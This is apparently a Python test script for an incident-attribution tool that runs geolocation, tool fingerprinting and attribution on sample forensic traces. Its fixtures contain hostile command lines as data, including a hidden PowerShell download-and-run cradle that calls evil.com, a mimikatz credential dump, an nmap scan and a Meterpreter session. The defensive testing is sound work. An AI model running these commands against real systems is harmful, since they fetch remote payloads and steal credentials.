"""Test script for the Attribution module."""

import logging
import sys
import os
from pathlib import Path
import json
from src.attribution.geolocation import IPGeolocation
from src.attribution.tool_fingerprinting import ToolFingerprinting
from src.attribution.attribution_engine import AttributionEngine

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

def create_sample_traces():
    """Create sample traces for testing."""
    return {
        "timestamp": "2025-03-06T07:45:00",
        "processes": [
            {
                "pid": 1234,
                "name": "cmd.exe",
                "username": "user",
                "cpu_usage": 2.5,
                "memory_usage": 10.2,
                "cmdline": "cmd.exe /c whoami"
            },
            {
                "pid": 5678,
                "name": "powershell.exe",
                "username": "user",
                "cpu_usage": 5.1,
                "memory_usage": 25.7,
                "cmdline": "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload')\""
            },
            {
                "pid": 9012,
                "name": "mimikatz.exe",
                "username": "administrator",
                "cpu_usage": 15.3,
                "memory_usage": 45.2,
                "cmdline": "mimikatz.exe sekurlsa::logonpasswords"
            }
        ],
        "network_connections": [
            {
                "pid": 1234,
                "local_address": {"ip": "192.168.1.100", "port": 49152},
                "remote_address": {"ip": "203.0.113.1", "port": 443},
                "status": "ESTABLISHED"
            },
            {
                "pid": 5678,
                "local_address": {"ip": "192.168.1.100", "port": 49153},
                "remote_address": {"ip": "198.51.100.1", "port": 80},
                "status": "ESTABLISHED"
            },
            {
                "pid": 9012,
                "local_address": {"ip": "192.168.1.100", "port": 49154},
                "remote_address": {"ip": "45.60.70.80", "port": 8080},
                "status": "ESTABLISHED",
                "payload": "MZ...This program cannot be run in DOS mode..."
            }
        ],
        "system_resources": {
            "cpu_percent": 15.2,
            "memory_percent": 45.7,
            "disk_io": {"read_bytes": 1024, "write_bytes": 2048}
        },
        "techniques": ["T1059", "T1078", "T1003"]
    }

def test_geolocation():
    """Test the IPGeolocation component."""
    try:
        logger.info("Initializing IPGeolocation...")
        geolocation = IPGeolocation()
        
        # Test private IP
        private_ip = "192.168.1.1"
        logger.info(f"Testing geolocation for private IP: {private_ip}")
        private_result = geolocation.get_geolocation(private_ip)
        
        logger.info("Private IP geolocation result:")
        logger.info(f"- IP: {private_result.get('ip')}")
        logger.info(f"- Country: {private_result.get('country')}")
        logger.info(f"- Is Private: {private_result.get('is_private')}")
        
        # Test public IP
        public_ip = "8.8.8.8"  # Google DNS
        logger.info(f"Testing geolocation for public IP: {public_ip}")
        public_result = geolocation.get_geolocation(public_ip)
        
        logger.info("Public IP geolocation result:")
        logger.info(f"- IP: {public_result.get('ip')}")
        logger.info(f"- Country: {public_result.get('country')}")
        logger.info(f"- City: {public_result.get('city')}")
        logger.info(f"- ISP: {public_result.get('isp')}")
        
        return True
    except Exception as e:
        logger.error(f"Error testing geolocation: {str(e)}")
        return False

def test_tool_fingerprinting():
    """Test the ToolFingerprinting component."""
    try:
        logger.info("Initializing ToolFingerprinting...")
        fingerprinting = ToolFingerprinting()
        
        # Create sample processes
        processes = [
            {
                "pid": 1234,
                "name": "nmap.exe",
                "cmdline": "nmap -sS -p 1-1000 192.168.1.1"
            },
            {
                "pid": 5678,
                "name": "cmd.exe",
                "cmdline": "cmd.exe /c whoami"
            },
            {
                "pid": 9012,
                "name": "mimikatz.exe",
                "cmdline": "mimikatz.exe sekurlsa::logonpasswords"
            }
        ]
        
        logger.info("Identifying tools from processes...")
        identified_tools = fingerprinting.identify_tools_from_processes(processes)
        
        logger.info("Identified tools:")
        for tool in identified_tools:
            logger.info(f"- {tool.get('name')}: {tool.get('description')}")
            logger.info(f"  Process: {tool.get('process_name')} (PID: {tool.get('process_id')})")
            logger.info(f"  Confidence: {tool.get('confidence')}")
            
        # Create sample network connections
        connections = [
            {
                "pid": 1234,
                "local_address": {"ip": "192.168.1.100", "port": 49152},
                "remote_address": {"ip": "203.0.113.1", "port": 4444},
                "payload": "Meterpreter session established"
            }
        ]
        
        logger.info("Identifying tools from network connections...")
        network_tools = fingerprinting.identify_tools_from_network(connections)
        
        logger.info("Identified network tools:")
        for tool in network_tools:
            logger.info(f"- {tool.get('name')}: {tool.get('description')}")
            logger.info(f"  Connection: {tool.get('connection', {}).get('local', {})} -> {tool.get('connection', {}).get('remote', {})}")
            logger.info(f"  Confidence: {tool.get('confidence')}")
            
        return True
    except Exception as e:
        logger.error(f"Error testing tool fingerprinting: {str(e)}")
        return False

def test_attribution_engine():
    """Test the AttributionEngine component."""
    try:
        logger.info("Initializing AttributionEngine...")
        attribution_engine = AttributionEngine()
        
        # Create sample traces
        traces = create_sample_traces()
        
        logger.info("Attributing attack...")
        attribution_result = attribution_engine.attribute_attack(traces)
        
        logger.info("Attribution result:")
        logger.info(f"- Attribution ID: {attribution_result.get('attribution_id')}")
        logger.info(f"- Confidence Score: {attribution_result.get('confidence_score')}")
        
        logger.info("Potential actors:")
        for actor in attribution_result.get("potential_actors", []):
            logger.info(f"- {actor.get('name')} (Match Score: {actor.get('match_score')})")
            logger.info(f"  Matches: {', '.join(actor.get('matches', []))}")
            
        logger.info("Geolocation data:")
        for geo in attribution_result.get("geolocation_data", []):
            logger.info(f"- {geo.get('ip')}: {geo.get('country')} ({geo.get('city')})")
            
        logger.info("Identified tools:")
        for tool in attribution_result.get("identified_tools", []):
            logger.info(f"- {tool.get('name')}")
            
        logger.info("Overall assessment:")
        logger.info(attribution_result.get("overall_assessment"))
        
        return True
    except Exception as e:
        logger.error(f"Error testing attribution engine: {str(e)}")
        return False

if __name__ == "__main__":
    success = test_geolocation() and test_tool_fingerprinting() and test_attribution_engine()
    sys.exit(0 if success else 1)
